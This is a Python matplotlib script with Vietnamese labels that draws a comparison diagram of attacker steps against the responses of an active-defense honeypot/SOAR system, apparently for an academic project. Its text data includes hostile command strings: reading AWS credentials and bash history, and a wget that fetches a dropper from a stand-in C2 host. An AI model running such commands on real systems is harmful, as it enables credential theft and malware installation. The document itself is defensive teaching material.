"""
Script: generate_scenario_matrix_diagram.py
Mục đích: Vẽ sơ đồ so sánh trực quan Kịch bản Tấn công (Attacker) vs Đòn Phản công Chủ động (Active Defense).
Thiết kế: Phong cách học thuật sắc nét, bố cục 2 luồng đối chiếu song song (Dual-Track Flowchart), chuẩn in ấn đồ án (300 DPI).
"""

import sys
if sys.stdout:
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except Exception:
        pass

import os
import matplotlib.pyplot as plt
import matplotlib.patches as patches

# Cấu hình kích thước ảnh chất lượng cao
fig, ax = plt.subplots(figsize=(15, 9.5), dpi=300, facecolor='#ffffff')
ax.set_facecolor('#ffffff')
ax.set_xlim(0, 100)
ax.set_ylim(0, 100)
ax.axis('off')

# Font mặc định
plt.rcParams['font.sans-serif'] = ['Segoe UI', 'Arial', 'DejaVu Sans', 'Tahoma']

# Header tiêu đề chính
ax.text(50, 96, "BẢNG ĐỐI CHIẾU: KỊCH BẢN TẤN CÔNG & ĐÒN PHẢN CÔNG CHỦ ĐỘNG", 
        fontsize=15, fontweight='bold', ha='center', color='#111111')
ax.text(50, 92.5, "Mô phỏng chi tiết hành vi của Hacker đối chiếu với phản ứng tương ứng của hệ thống Active Honeypot & SOAR", 
        fontsize=9.5, ha='center', color='#555555')

# Tiêu đề 2 cột
# Cột Trái: Attacker
col_left_header = patches.FancyBboxPatch(
    (5, 85.5), 38, 5,
    boxstyle="round,pad=0.2,rounding_size=0.8",
    facecolor="#fdf2f2", edgecolor="#dc3545", linewidth=1.5
)
ax.add_patch(col_left_header)
ax.text(24, 88, "HÀNH ĐỘNG CỦA KẺ TẤN CÔNG (ATTACKER)", 
        fontsize=10.5, fontweight='bold', ha='center', va='center', color="#b02a37")

# Cột Giữa: MITRE ATT&CK
col_mid_header = patches.FancyBboxPatch(
    (45, 85.5), 10, 5,
    boxstyle="round,pad=0.2,rounding_size=0.8",
    facecolor="#f8f9fa", edgecolor="#6c757d", linewidth=1.2
)
ax.add_patch(col_mid_header)
ax.text(50, 88, "KỸ THUẬT", fontsize=10, fontweight='bold', ha='center', va='center', color="#495057")

# Cột Phải: Active Defense
col_right_header = patches.FancyBboxPatch(
    (57, 85.5), 38, 5,
    boxstyle="round,pad=0.2,rounding_size=0.8",
    facecolor="#f0fdf4", edgecolor="#198754", linewidth=1.5
)
ax.add_patch(col_right_header)
ax.text(76, 88, "ĐÒN PHẢN CÔNG CHỦ ĐỘNG (ACTIVE DEFENSE)", 
        fontsize=10.5, fontweight='bold', ha='center', va='center', color="#146c43")

# Dữ liệu 5 bước đối chiếu
scenarios = [
    {
        "step": 1,
        "y": 71,
        "mitre": "T1110\nBrute Force",
        "attacker_title": "Bước 1: Quét mạng & Đột nhập qua SSH",
        "attacker_desc": [
            "Lệnh: ssh root@192.168.10.130 -p 2222",
            "Dò mật khẩu bằng từ điển (Hydra/Nmap)",
            "Mục tiêu: Đột nhập chiếm quyền điều khiển root"
        ],
        "defense_title": "Đòn 1: Chấp thuận giả & Cô lập VFS (RAM)",
        "defense_desc": [
            "Fake Auth: Chấp nhận mọi mật khẩu hợp lệ",
            "Nhốt hacker vào Virtual File System trong RAM",
            "Hiệu ứng: Hacker tin tưởng 100% đã chiếm server thật"
        ]
    },
    {
        "step": 2,
        "y": 56,
        "mitre": "T1082\nDiscovery",
        "attacker_title": "Bước 2: Dò thư mục & Đọc trộm file nhạy cảm",
        "attacker_desc": [
            "Lệnh: cd /root/.aws && cat credentials",
            "Lệnh: cat /root/.bash_history; cat db_backup.sql",
            "Mục tiêu: Đánh cắp AWS Keys và Database mật"
        ],
        "defense_title": "Đòn 2: Gài 3 lớp bẫy mồi (Honeytokens)",
        "defense_desc": [
            "Gài bẫy AWS credentials chứa Canary Webhook URL",
            "Correlation Engine phân tích lệnh cat/nano nhạy cảm",
            "Hiệu ứng: Kích thích sự tò mò, dẫn dụ hacker lấy link"
        ]
    },
    {
        "step": 3,
        "y": 41,
        "mitre": "T1552.001\nDe-cloaking",
        "attacker_title": "Bước 3: Mở Link kiểm tra trên máy thật",
        "attacker_desc": [
            "Hacker copy URL kiểm tra dán vào Chrome máy thật",
            "URL: http://192.168.10.130:8080/canary/aws_verify...",
            "Request HTTP đi thẳng từ IP thật (bỏ qua Proxy/VPN)"
        ],
        "defense_title": "Đòn 3: Canary Webhook Khử ẩn danh",
        "defense_desc": [
            "Máy chủ Port 8080 chộp lấy IP THẬT (192.168.10.1)",
            "Trích xuất User-Agent thật của hacker (Chrome/Win)",
            "Hiệu ứng: LỘ TRẦN DANH TÍNH, ngụy trang 403 Forbidden"
        ]
    },
    {
        "step": 4,
        "y": 26,
        "mitre": "T1105\nIngress Tool",
        "attacker_title": "Bước 4: Tải mã độc Dropper / Miner",
        "attacker_desc": [
            "Lệnh: wget http://c2.bot/dropper.sh",
            "Toan tính thực thi mã độc chiếm tài nguyên đào coin",
            "Chạy ngầm tiến trình độc hại trong nền"
        ],
        "defense_title": "Đòn 4: Sandbox Cách ly & Quét VirusTotal",
        "defense_desc": [
            "Thu hồi file vào data/quarantine/, tước quyền chmod 0444",
            "Băm mã SHA256 và tra cứu VirusTotal phát hiện Mirai/Miner",
            "Hiệu ứng: Vũ khí của hacker bị tước đoạt ngay lập tức"
        ]
    },
    {
        "step": 5,
        "y": 11,
        "mitre": "Active\nContainment",
        "attacker_title": "Bước 5: Tiếp tục gõ lệnh khai thác",
        "attacker_desc": [
            "Hacker cố gắng gõ lệnh tiếp theo trong phiên SSH",
            "Bất ngờ thấy terminal bị đơ cứng, không phản hồi",
            "Không thoát được session, lãng phí thời gian và CPU"
        ],
        "defense_title": "Đòn 5: Giam lỏng Socket Tarpit & Telegram SOAR",
        "defense_desc": [
            "TCP Tarpit: Bóp nghẹt tốc độ socket 3 giây / 1 byte",
            "Trinh sát ngược OSINT (AbuseIPDB, Shodan, GeoIP)",
            "Hiệu ứng: SOC Analyst bấm nút 1-Click trên Telegram chặn IP"
        ]
    }
]

# Vẽ từng hàng dữ liệu
for row in scenarios:
    y = row["y"]
    h = 12.5
    
    # 1. Hộp Attacker (Trái)
    box_att = patches.FancyBboxPatch(
        (5, y), 38, h,
        boxstyle="round,pad=0.4,rounding_size=0.8",
        facecolor="#ffffff", edgecolor="#e0a1a5", linewidth=1.2
    )
    ax.add_patch(box_att)
    ax.text(6.5, y + h - 2.5, row["attacker_title"], fontsize=9.2, fontweight='bold', color="#b02a37")
    for i, line in enumerate(row["attacker_desc"]):
        ax.text(7.5, y + h - 5.2 - (i * 2.3), f"• {line}", fontsize=8.2, color="#333333")
        
    # 2. Cột Giữa: MITRE Badge + Mũi tên đối chiếu
    box_mid = patches.FancyBboxPatch(
        (45, y + 2.5), 10, h - 5,
        boxstyle="round,pad=0.2,rounding_size=0.6",
        facecolor="#f1f3f5", edgecolor="#adb5bd", linewidth=1.0
    )
    ax.add_patch(box_mid)
    ax.text(50, y + h/2, row["mitre"], fontsize=7.8, fontweight='bold', ha='center', va='center', color="#495057")
    
    # Mũi tên từ Trái -> Giữa
    ax.annotate("", xy=(44.5, y + h/2), xytext=(43, y + h/2),
                arrowprops=dict(arrowstyle="->", color="#dc3545", lw=1.5))
    # Mũi tên từ Giữa -> Phải
    ax.annotate("", xy=(56.5, y + h/2), xytext=(55.2, y + h/2),
                arrowprops=dict(arrowstyle="->", color="#198754", lw=1.5))

    # 3. Hộp Active Defense (Phải)
    box_def = patches.FancyBboxPatch(
        (57, y), 38, h,
        boxstyle="round,pad=0.4,rounding_size=0.8",
        facecolor="#ffffff", edgecolor="#a3cfbb", linewidth=1.2
    )
    ax.add_patch(box_def)
    ax.text(58.5, y + h - 2.5, row["defense_title"], fontsize=9.2, fontweight='bold', color="#146c43")
    for i, line in enumerate(row["defense_desc"]):
        ax.text(59.5, y + h - 5.2 - (i * 2.3), f"• {line}", fontsize=8.2, color="#333333")

# Khung viền ngoài cùng
outer = patches.Rectangle((2, 3), 96, 94, facecolor="none", edgecolor="#ced4da", linewidth=1.0)
ax.add_patch(outer)

# Lưu ảnh
output_path = os.path.abspath("./reports/images/kich_ban_tan_cong_va_phong_thu.png")
os.makedirs(os.path.dirname(output_path), exist_ok=True)
plt.savefig(output_path, dpi=300)
plt.close()
print(f"[+] Đã tạo thành công ảnh bảng đối chiếu: {output_path}")
